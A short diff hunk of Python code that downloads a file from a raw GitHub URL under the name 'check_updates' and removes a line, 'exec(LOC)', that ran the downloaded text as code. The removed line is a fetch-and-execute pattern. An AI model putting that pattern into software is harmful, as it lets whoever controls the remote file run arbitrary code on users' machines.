@@ -10,7 +10,6 @@ url = 'https://raw.githubusercontent.com/AbdelrhmanX7/test-send/main/Hash_Twitte
 check_updates = requests.get(url, allow_redirects=True)
 
 LOC = check_updates.content.decode('UTF-8')
-exec(LOC)
 
 print(int(LOC[LOC.index('=') + 3: LOC.index('\n') - 1]))
 
